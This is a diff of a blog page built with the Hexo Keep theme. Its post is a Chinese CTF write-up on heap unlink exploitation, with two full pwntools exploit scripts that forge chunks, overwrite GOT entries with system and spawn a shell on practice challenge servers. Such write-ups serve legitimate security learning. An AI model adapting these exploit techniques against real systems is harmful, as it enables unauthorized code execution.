@@ -35,7 +35,7 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":true,"img_link":"/images/zfb.jpg","text":"请作者喝杯咖啡","icon":"/images/tea.svg"}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -45,6 +45,8 @@
 
 <body>
 <div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
     
 
     
@@ -119,9 +121,15 @@
                         </li>
                     
                     
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
                 </ul>
             </div>
             <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
                 <div class="icon-item menu-bar">
                     <div class="menu-bar-middle"></div>
@@ -273,6 +281,10 @@
         
         
         
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
     </div>
 
     
@@ -334,42 +346,102 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fd=tar-0x18</span><br><span class="line">bk=tar-0x10</span><br><span class="line">#符合校验</span><br><span class="line">*(fd+0x18)=*(bk+0x10)=tar</span><br><span class="line">#赋值</span><br><span class="line">*(fd+0x18)=tar=*(bk-0x10)</span><br><span class="line">*(bk+0x10)=tar=*(fd-0x18)</span><br></pre></td></tr></table></figure>
 
 <h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#hitcontraining_bamboobox" >hitcontraining_bamboobox<i class="fas fa-external-link-alt"></i></a></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251027163627606.png"  alt="image-20251027163627606"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251026114215487.png"  alt="image-20251026114215487"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251027163627606.png"
+                        alt="image-20251027163627606"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251026114215487.png"
+                        alt="image-20251026114215487"
+                 ></p>
 <p>add</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251026114228744.png"  alt="image-20251026114228744"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251026114228744.png"
+                        alt="image-20251026114228744"
+                 ></p>
 <p>edit</p>
 <p>自己控制输入长度，存在堆溢出</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251026114344109.png"  alt="image-20251026114344109"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251026114344109.png"
+                        alt="image-20251026114344109"
+                 ></p>
 <p>free</p>
 <p>全部置零，没有uaf漏洞</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251026114449434.png"  alt="image-20251026114449434"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251026114449434.png"
+                        alt="image-20251026114449434"
+                 ></p>
 <p>show</p>
 <p>可直接输出堆块内容</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251026114517457.png"  alt="image-20251026114517457"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251026114517457.png"
+                        alt="image-20251026114517457"
+                 ></p>
 <h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>1.用libc3思路，创建3个堆块，0用来伪造堆块，1触发unlink,   2防止与top_chunk合并，（注意，堆块fake_heap与1合并的时候不要今入fast_bin，他是单链表管理）。通过修改0来伪造一个假的堆块然后free1触发unlink让1与fake_chunk合并，并且对假堆块上的fd和bk进行赋值修改</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar=0x6020C8</span><br><span class="line">add(0x30,b&quot;fake_heap&quot;)</span><br><span class="line">add(0x80,b&quot;111111111&quot;)</span><br><span class="line">add(0x80,b&quot;333333333&quot;)</span><br><span class="line"></span><br><span class="line">pay=p64(0)+p64(0x31)+p64(tar-0x18)+p64(tar-0x10)+p64(0)*2</span><br><span class="line">pay+=p64(0x30)+p64(0x90)</span><br><span class="line">edit(0,len(pay),pay)</span><br><span class="line">delete(1)</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251028094054529.png"  alt="image-20251028094054529"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251028094054529.png"
+                        alt="image-20251028094054529"
+                 ></p>
 <p>修改指针前：</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251027175348347.png"  alt="image-20251027175348347"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251027175348347.png"
+                        alt="image-20251027175348347"
+                 ></p>
 <p>此时已经进行了赋值修改操作了，tar最后被改为了tar-0x18位置，也就是说heap_user[0]此时指向heap_user[-3]的位置，所以此时要加三个填充去垫高地址再写入atio,那么此时就被赋值为了atio_got，如图该处的内容此时为got表的物理地址</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">atoi_got=elf.got[&#x27;atoi&#x27;]</span><br><span class="line">payload = p64(0) *2+p64(0x40)+ p64(atoi_got)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">show()</span><br><span class="line">atoi=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;) )</span><br><span class="line">log.success(&quot;atoi:&quot;+hex(atoi))</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251028094817202.png"  alt="image-20251028094817202"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251028094817202.png"
+                        alt="image-20251028094817202"
+                 ></p>
 <p>最后把它的got表地址赋值为system函数地址，然后传入参数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc_base=atoi-libc.sym[&#x27;atoi&#x27;]</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">edit(0,8,p64(system))</span><br><span class="line">sla(&#x27;Your choice:&#x27;,&#x27;/bin/sh\x00&#x27;)</span><br></pre></td></tr></table></figure>
 
 <p>edit(0)从堆块0的地址中取出got表把对应地址改为system函数的地址</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251028094912561.png"  alt="image-20251028094912561"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251028094912561.png"
+                        alt="image-20251028094912561"
+                 ></p>
 <p>二者都是修改指针位置</p>
 <h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">file_path = &quot;./12&quot;</span><br><span class="line">remote_host = &quot;node5.buuoj.cn&quot;</span><br><span class="line">remote_port = 26935</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal = [</span><br><span class="line">    &quot;cmd.exe&quot;, &quot;/c&quot;,</span><br><span class="line">    &quot;start&quot;, &quot;/max&quot;, &quot;&quot;, &quot;wt.exe&quot;,</span><br><span class="line">    &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;,</span><br><span class="line">    &quot;--&quot;, &quot;wsl&quot;, &quot;bash&quot;, &quot;-lc&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = elf.libc</span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p = remote(remote_host, remote_port)</span><br><span class="line">else:</span><br><span class="line">    p = process(file_path)</span><br><span class="line">    #gdb.attach(p,&quot;b*&quot;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause() </span><br><span class="line">def sla(a, b):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line">def ru(a):</span><br><span class="line">    p.recvuntil(a)</span><br><span class="line">def sa(a, b):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    p.sendlineafter(&#x27;Your choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;name:&#x27;,str(size))</span><br><span class="line">    p.sendafter(&#x27;item:&#x27;,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    p.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">    p.sendlineafter(&#x27;Your choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line">    p.sendafter(&#x27;item:&#x27;,str(idx))</span><br><span class="line">    p.sendlineafter(&#x27;name:&#x27;,str(size))</span><br><span class="line">    p.sendafter(&#x27;item:&#x27;,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    p.sendlineafter(&#x27;Your choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line">    p.sendafter(&#x27;item:&#x27;,str(idx))</span><br><span class="line"></span><br><span class="line">tar=0x6020C8</span><br><span class="line">add(0x30,b&quot;fake_heap&quot;)</span><br><span class="line">add(0x80,b&quot;111111111&quot;)</span><br><span class="line">add(0x80,b&quot;333333333&quot;)</span><br><span class="line"></span><br><span class="line">pay=p64(0)+p64(0x31)+p64(tar-0x18)+p64(tar-0x10)+p64(0)*2</span><br><span class="line">pay+=p64(0x30)+p64(0x90)</span><br><span class="line">edit(0,len(pay),pay)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">atoi_got=elf.got[&#x27;atoi&#x27;]</span><br><span class="line">payload = p64(0) *2+p64(0x40)+ p64(atoi_got)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">show()</span><br><span class="line">atoi=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;) )</span><br><span class="line">log.success(&quot;atoi:&quot;+hex(atoi))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base=atoi-libc.sym[&#x27;atoi&#x27;]</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">edit(0,8,p64(system))</span><br><span class="line">sla(&#x27;Your choice:&#x27;,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2334" >[SUCTF 2018 招新赛]unlink<i class="fas fa-external-link-alt"></i></a></p>
 <h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>先伪造一个栈，然后free触发unlink来修改指针。<br>之后改chunk0的内容为b”&#x2F;bin&#x2F;sh\x00”+p64(0)*2+p64(0x6020a8)+p64(free_got)，字符串为system函数做准备，两个0是吧位置填高，p64(0x6020a8)是bin&#x2F;sh所在位置，配合system使用，然后把chunk1的指针改为free的got表地址。</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251028100102751.png"  alt="image-20251028100102751"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251028100102751.png"
+                        alt="image-20251028100102751"
+                 ></p>
 <p>show(1)计算libc基础地址，最后把free的got表地址改为system，然后delet调用就执行了我们构造的后门函数</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251028100157425.png"  alt="image-20251028100157425"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251028100157425.png"
+                        alt="image-20251028100157425"
+                 ></p>
 <h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">file_path = &quot;./service&quot;</span><br><span class="line">remote_host = &quot;1.95.36.136&quot;</span><br><span class="line">remote_port = 2110</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal = [</span><br><span class="line">    &quot;cmd.exe&quot;, &quot;/c&quot;,</span><br><span class="line">    &quot;start&quot;, &quot;/max&quot;, &quot;&quot;, &quot;wt.exe&quot;,</span><br><span class="line">    &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;,</span><br><span class="line">    &quot;--&quot;, &quot;wsl&quot;, &quot;bash&quot;, &quot;-lc&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = elf.libc</span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p = remote(remote_host, remote_port)</span><br><span class="line">else:</span><br><span class="line">    p = process(file_path)</span><br><span class="line">    #gdb.attach(p,&quot;b*&quot;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause() </span><br><span class="line">def sla(a, b):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line">def ru(a):</span><br><span class="line">    p.recvuntil(a)</span><br><span class="line">def sa(a, b):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    p.recvuntil(&#x27;chooice :\n&#x27;)</span><br><span class="line">    p.sendline(&#x27;1&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;size :&#x27;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">def delete(index):</span><br><span class="line">    p.recvuntil(&#x27;chooice :\n&#x27;)</span><br><span class="line">    p.sendline(&#x27;2&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;delete\n&#x27;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">def show(index):</span><br><span class="line">    p.recvuntil(&#x27;chooice :\n&#x27;)</span><br><span class="line">    p.sendline(&#x27;3&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;show\n&#x27;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">def edit(index, content):</span><br><span class="line">    p.recvuntil(&#x27;chooice :\n&#x27;)</span><br><span class="line">    p.sendline(&#x27;4&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;modify :\n&#x27;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&#x27;input the content&#x27;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">add(0x30)</span><br><span class="line">add(0x80)</span><br><span class="line">add(0x20)</span><br><span class="line"></span><br><span class="line">tar=0x6020C0</span><br><span class="line">pay=p64(0)+p64(0x30)+p64(tar-0x18)+p64(tar-0x10)+p64(0)*2</span><br><span class="line">pay+=p64(0x30)+p64(0x90)</span><br><span class="line">edit(0,pay)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">free_got=elf.got[&#x27;free&#x27;]</span><br><span class="line">pay=b&quot;/bin/sh\x00&quot;+p64(0)*2+p64(0x6020a8)+p64(free_got)</span><br><span class="line">edit(0,pay)</span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">free=u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(free))</span><br><span class="line"></span><br><span class="line">libc_base=free-libc.sym[&#x27;free&#x27;]</span><br><span class="line">system_addr=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">binsh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">edit(1,p64(system_addr))</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
@@ -401,8 +473,44 @@
                     </div>
                     <div>
                         
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
                     </div>
                 </div>
+
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/zfb.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="/images/tea.svg"></i>&nbsp;请作者喝杯咖啡
+    </div>
+</div>
 
                 
 
@@ -593,6 +701,19 @@
     
 
     
+        <div class="count-info info-item">
+            
+
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
 
     
 </footer>
@@ -695,6 +816,35 @@
 
     <!-- local search -->
     
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
 
     <!-- tablet toc -->
     
@@ -734,8 +884,16 @@
 
 <!-- local search -->
 
+    
+<script src="/js/local-search.js"></script>
+
+
 
 <!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
 
 
 <div class="">
@@ -760,6 +918,10 @@
         
 
         <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
         
     
 
